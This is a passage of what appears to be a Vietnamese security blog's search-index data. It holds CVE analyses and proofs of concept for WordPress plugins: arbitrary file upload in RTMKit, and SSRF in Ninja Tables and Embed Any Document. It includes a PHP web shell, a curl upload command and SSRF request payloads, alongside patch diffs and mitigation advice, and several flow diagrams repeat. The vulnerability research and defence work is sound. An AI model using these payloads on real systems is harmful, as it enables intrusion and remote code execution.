file vào thư mục cao hơn. Cuối cùng file được lưu trong trong {wp_upload_dir}/rometheme_template/{hashId}/ Trả về JSON rtm_handle_upload_template() được đăng ký làm callback cho action hook: add_action('wp_ajax_rtm_handle_upload_template', [$this, 'rtm_handle_upload_template']); Có nghĩa là: Khi người dùng gửi yêu cầu AJAX đến wp-admin/admin-ajax.php với action=rtm_handle_upload_template, hàm rtm_handle_upload_template() sẽ được gọi để xử lý yêu cầu. ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\rgraph LR;\rA[POST REQUEST /wp-admin/admin-ajax.php?action=rtm_handle_upload_template] --\u003e B[\"rtm_handle_upload_template()\"]\rB --\u003e C{is .zip extension}\rC --\u003e|True| D{\"check_ajax_referer()\"}\rC --\u003e|False| E[\"wp_send_json_error()\"]\rD --\u003e|True| F[\"template_extract()\"]\rD --\u003e|False| G[Return 401]\rF --\u003e|Extract To| H[\"{wp_upload_dir}/rometheme_template/{hashId}/\"]\r","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rĐăng nhập bài tài khoản Contributor Tạo post và edit bằng Elementor Gọi rkit_libs.template_nonce để lấy nonce Tạo file để RCE \u003c?php system($_GET['cmd']) ?\u003e Nén file vừa tạo zip rce.zip rce.php Gửi request upload file curl -X POST \"http://localhost/wp-admin/admin-ajax.php\" \\ -b \"your_cookie\" \\ -F \"action=rtm_handle_upload_template\" \\ -F \"nonce=your_nonce\" \\ -F \"file=@rce.zip;filename=rce.zip;type=application/zip\" Truy cập file vừa upload RCE với file upload\rCâu hỏi\rĐiều tôi muốn nhấn mạnh là, mặc dù tệp này có thể truy cập thẳng, nhưng việc truy cập trực tiếp vẫn bị hạn chế bởi hashid, do WordPress mặc định không cho phép liệt kê nội dung thư mục. ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng là chuỗi: Arbitrary File Upload + file tạm public + giải nén thiếu kiểm soát → rủi ro RCE. Bản vá (1.6.6) khắc phục bằng kiểm tra quyền, lưu tạm không public, whitelist ext, chặn traversal và scan nội dung. ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rCập nhật lên 1.6.6 ngay. Nếu chưa cập nhật: vô hiệu hoá upload template hoặc giới hạn chỉ admin. Luôn lưu file upload ở nơi không public, whitelist ext, chặn path traversal và scan nội dung trước khi giải nén. ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rArbitrary File Upload WordPress RTMKit Plugin \u003c= 1.6.5 is vulnerable to Arbitrary File Upload ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Tables Plugin.","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Ninja Tables – Easy Data Table Builder cho WordPress tồn tại lỗ hổng Server-Side Request Forgery (SSRF) trong tất cả các phiên bản cho đến và bao gồm 5.0.18, thông qua tham số args[url]. Lỗ hổng này cho phép unauthenticated attackers thực hiện các web requests đến các arbitrary locations bắt nguồn từ web application, và có thể được sử dụng để query và modify thông tin từ các internal services. CVE ID: CVE-2025-2940 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.0.18 Patched Versions: 5.0.19 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Ninja Tables Plugin ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Ninja Tables: 5.0.18 (vulnerable) và 5.0.19 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rTheo mô tả của CVE, vị trí đáng chú ý trong patch là chỗ mã xử lý args[url] — đây có thể là nguyên nhân chính dẫn đến lỗ hổng vì tham số này được sử dụng trực tiếp trong luồng thực hiện request. Vị trí tiền đề gây ra lỗ hổng\rTrong bản vá, đoạn mã dễ bị lợi dụng này đã được vô hiệu hoá (comment bằng //). ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rpublic static function registerAsyncRequestHandler() { $action = static::makeAsyncRequestAction(); App::addAction(\"admin_post_nopriv_{$action}\", function() { $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); $client = Client::make($requestUrl); $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; $callback = static::getCallback($params); $response = $client-\u003e{$requestMethod}('', $params); if (is_wp_error($response)) { $exception = new Exception( $response-\u003eget_error_message(), 500 ); } return $callback($response, $exception ?? null); }); } Hàm registerAsyncRequestHandler() là một trình đăng ký để tạo và xử lý một endpoint async trong WordPress - cụ thể là qua admin_post_nopriv_{action}, tức là hook cho phép người dùng chưa đăng nhập (nopriv) cũng có thể gửi request đến. Cụ thể, hàm sẽ xử lý như sau: Tạo tên action duy nhất cho plugin $action = static::makeAsyncRequestAction(); protected static function makeAsyncRequestAction() { return 'wpf-async-request-' . sha1( App::config()-\u003eget('app.slug') // plugin name: ninja-tables ); } Hàm makeAsyncRequestAction() tạo ra một chuỗi định danh duy nhất cho plugin bằng cách nối tiền tố cố định (wpf-async-request-) với giá trị SHA1 hash của tên plugin (app.slug). Vì plugin hiện tại có tên là \"ninja-tables\", nên kết quả trả về sẽ là: wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 Đăng ký action hook với callback là Anonymous function App::addAction(\"admin_post_nopriv_{$action}\", function() { ... }); Khi có HTTP request gửi đến endpoint /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77 thì logic trong anonymous function sẽ được gọi. Lấy instance của Request object từ container App và lấy 2 tham số chính $request = App::make('request'); $requestUrl = $request-\u003eget('args.url'); $requestMethod = $request-\u003eget('args.method'); Khởi tạo đối tượng Client với baseUrl lấy từ request $client = Client::make($requestUrl); public static function make($baseUrl = '', $args = []) { $args['cookies'] = $args['cookies'] ?? []; $args['headers'] = $args['headers'] ?? []; $args['options'] = $args['options'] ?? []; return new static($baseUrl, $args); } Phương thức Client::make() chịu trách nhiệm tạo và cấu hình một instance mới của lớp Client, dùng để quản lý và gửi các HTTP request. Giá trị $baseUrl được truyền trực tiếp từ $requestUrl - tức là URL mà người dùng cung cấp trong tham số args.url. Lấy tất cả tham số khác ngoài action, args.url, args.method $params = $request-\u003eexcept( 'action', 'args.url', 'args.method', )['args']; Giải mã và lấy hàm callback từ tham số request $callback = static::getCallback($params); protected static function getCallback(\u0026$params) { $callback = unserialize(base64_decode($params['callback'])); unset($params['callback']); return $callback; } Phương thức getCallback() dùng để trích xuất hàm callback được gửi kèm trong tham số args.callback của request. Gọi đến hàm $requestMethod với đối số $params $response = $client-\u003e{$requestMethod}('', $params); Ví dụ: $requestMethod là POST =\u003e $response = $client-\u003ePOST('', $params) Kiểm tra lỗi và trả về if (is_wp_error($response)) { $exception = new Exception( $response-\u003eget_error_message(), 500 ); } return $callback($response, $exception ?? null); Câu hỏi\rĐiều gì xảy ra nếu $requestMethod không tồn tại, tức $client gọi đến một phương thức không có trong class Client? Trong trường hợp này, PHP sẽ tự động gọi hàm magic __call() được khai báo trong class Client. Hàm __call() được thiết kế để xử lý tất cả các lời gọi phương thức không tồn tại, cho phép Client thực hiện request động dựa trên tên phương thức được gọi. Quan sát Outline tab ta thấy được tất cả các method, property và các hàm trong file theo thứ tự. Outline của file Client.php\rpublic function __call($method, $args) { if ($method === 'download') { return $this-\u003edownloadFile(...$args); } // Handles dynamic method calls like: // a","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"]\rE --\u003e F[\"Response → callback → HTTP Response\"]\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"]\rE --\u003e F[\"Response → callback → HTTP Response\"]\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"]\rE --\u003e F[\"Response → callback → HTTP Response\"]\rgraph TD\rA[\"HTTP Request\"] --\u003e B[\"admin_post_nopriv_{action}\"]\rB --\u003e C[\"$request-\u003eget('args.url') / $request-\u003eget('args.method')\"]\rC --\u003e D[\"$client-\u003e{$requestMethod}('', $params)\"]\rD --\u003e E[\"Client::__call() → request() → wp_remote_request() ← SSRF sink\"]\rE --\u003e F[\"Response → callback → HTTP Response\"]\r","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Local Server\rTạo local service đơn giản bằng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/delete') def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#local-server"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rGửi POST request với URL trỏ đến local service: POST /wp-admin/admin-post.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 Accept: */* Content-Type: application/x-www-form-urlencoded Content-Length: 146 Connection: close action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77\u0026args[url]=http://localhost:8001/delete?id=1\u0026args[method]=GET\u0026args[name]=Tokuda Result: GET request tới local service\r","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng SSRF trong Ninja Tables ≤ 5.0.18 cho thấy tham số args[url] do client cung cấp được sử dụng trực tiếp để thực hiện request phía server mà không kiểm tra, cho phép attacker (không cần xác thực) buộc ứng dụng truy cập tới địa chỉ tùy ý. Bản vá ≥ 5.0.19 đã loại bỏ đoạn mã nguy hiểm và khắc phục vector này. ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rNâng cấp ngay lên 5.0.19 hoặc mới hơn. Không dùng trực tiếp input của client làm URL cho request — validate/normalize trước khi sử dụng. Áp dụng allowlist cho host/port và chặn private IP ranges (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, v.v.). Tránh đăng ký endpoint admin_post_nopriv_* cho chức năng thực hiện outbound request hoặc thêm kiểm soát quyền/CSRF. ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Ninja Tables Plugin \u003c= 5.0.18 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-11-03","objectID":"/vi/posts/2025-11-03-cve-2025-2940/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-2940 Analysis \u0026 POC","uri":"/vi/posts/2025-11-03-cve-2025-2940/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Embed Any Document Plugin.","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin “Embed Any Document – Embed PDF, Word, PowerPoint and Excel Files” cho WordPress có lỗ hổng Server-Side Request Forgery (SSRF) trong tất cả các phiên bản đến và bao gồm 2.7.5 thông qua shortcode 'embeddoc'. Lỗ hổng này cho phép những kẻ tấn công đã xác thực, có quyền truy cập ở mức Contributor trở lên, thực hiện các yêu cầu web tới các địa chỉ tùy ý xuất phát từ ứng dụng web và có thể được sử dụng để truy vấn và sửa đổi thông tin từ các dịch vụ nội bộ. CVE ID: CVE-2025-1043 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 2.7.5 Patched Versions: 2.7.6 CVSS severity: Low (4.9) Required Privilege: Contributor Product: WordPress Embed Any Document Plugin ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed Any Document: 2.7.5 (vulnerable) và 2.7.6 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rpublic function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } Trong phiên bản lỗi, hàm embed_shortcode() thực hiện một HTTP HEAD request bằng hàm wp_remote_head() với giá trị url được lấy trực tiếp từ $shortcode_atts['url']. Do không có bất kỳ cơ chế xác thực, lọc, hoặc giới hạn phạm vi URL, kẻ tấn công có thể chèn vào đó một đường dẫn tùy ý =\u003e Dẫn đến request có thể gửi đến các local service khác gấy SSRF public function embed_shortcode( $atts ) { ... $show = false; $shortcode_atts = shortcode_atts( array( 'url' =\u003e '', 'drive' =\u003e '', 'viewer' =\u003e $default_provider, 'download' =\u003e $default_download, ... ), $atts ); if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) : ... if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } $url = esc_url( $shortcode_atts['url'], array( 'http', 'https' ) ); if ( $show ) { $filedata = wp_safe_remote_head( $shortcode_atts['url'] ); ... } ... return $embed; } Bản vá đã thay thế việc sử dụng wp_remote_head() bằng hàm wp_safe_remote_head(), hàm này bổ sung các cơ chế kiểm tra an toàn nhằm ngăn chặn truy cập đến các địa chỉ nội bộ, private, loopback hoặc link-local, qua đó giảm thiểu nguy cơ tấn công SSRF. ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rĐể đoạn wp_remote_head( $shortcode_atts['url'] ) trong embed_shortcode() thực sự được gọi, ta cần bypass tất cả các ràng buộc sau: url phải tồn tại và không rỗng if ( isset( $shortcode_atts['url'] ) \u0026\u0026 ! empty( $shortcode_atts['url'] ) ) Biến $show phải được đặt thành true trước khi vào khối gọi HEAD $show mặc định false. Nó chỉ trở thành true khi if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) trả về true và một trong hai điều kiện sau đúng: if ( $this-\u003eallowdownload( $shortcode_atts['viewer'] ) ) { if ( $shortcode_atts['download'] === 'alluser' || $shortcode_atts['download'] === 'all' ) { $show = true; } elseif ( $shortcode_atts['download'] === 'logged' \u0026\u0026 is_user_logged_in() ) { $show = true; } } download bằng 'alluser' hoặc 'all'. download bằng 'logged' và is_user_logged_in() trả về true (tức người dùng đã đăng nhập). public function allowdownload( $provider ) { $blacklist = array( 'drive', 'box' ); if ( in_array( $provider, $blacklist, true ) ) { return false; } else { return true; } } allowdownload() sẽ trả về true nếu $provider ($shortcode_atts['viewer']) không tồn tại hoặc không nằm trong $blacklist Lỗi\rVì SSRF dùng HTTP HEAD nên không đọc được body trực tiếp, nhưng vẫn có thể lộ metadata (Content-Type, Content-Length) và thăm dò/khám phá các endpoint nội bộ. Nếu endpoint không phân biệt method có thể dẫn đến thay đổi, xóa dữ liệu nhạy cảm.\rembed_shortcode() được đăng ký làm callback cho shortcode: add_shortcode( 'embeddoc', array( $this, 'embed_shortcode' ) ); ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\rgraph TD\rA[\"Shortcode: [embeddoc url=...]\"] --\u003e B[\"embed_shortcode($atts)\"]\rB --\u003e C{\"isset($shortcode_atts['url']) \u0026\u0026 !empty(...)?\"}\rC -- Yes --\u003e D{\"$this-\u003eallowdownload($shortcode_atts['viewer'])?\"}\rC -- No --\u003e End1[No request]\rD -- Yes --\u003e E{\"download == 'all'|'alluser' OR (download=='logged' \u0026\u0026 is_user_logged_in())?\"}\rD -- No --\u003e End2[No request]\rE -- Yes --\u003e F[\"wp_remote_head($shortcode_atts['url']) ← SSRF sink\"]\rE -- No --\u003e End3[No request]\rF --\u003e G[\"Return to client\"]\r","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Local Server\rTạo local service đơn giản bằng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/delete') def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#local-server"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rLogin bằng tài khoản Contributor Tạo post với shortcode [embeddoc url=http://localhost:8001/delete?id=1 download=all] Result: HEAD request tới local service\r","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rCVE-2025-1043 là SSRF do plugin gọi wp_remote_head() với URL từ shortcode mà không kiểm tra. Dù là HEAD (không có body), vẫn có thể lộ metadata, thăm dò dịch vụ nội bộ hoặc, khi có redirect/endpoint không phân biệt method, gây thay đổi trạng thái. Bản vá (v2.7.6) dùng esc_url_raw() + wp_safe_remote_head() để giảm rủi ro. ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 POC","uri":"/vi/posts/2025-11-02-cve-2025-1043/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rNguyên nhân: thiếu lọc/whitelist URL trước khi gọi HTTP từ server. Ảnh hưởng: metadata leak, internal discovery, khả năng chuỗi tấn công (redirect → GET, method-agnostic endpoints). Fix: cập nhật lên v2.7.6. Khuyến nghị ngắn: dùng wp_safe_remote_*, esc_url_raw()/whitelist, tắt redirect khi chỉ cần header, và giới hạn quyền người dùng. ","date":"2025-11-02","objectID":"/vi/posts/2025-11-02-cve-2025-1043/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-1043 Analysis \u0026 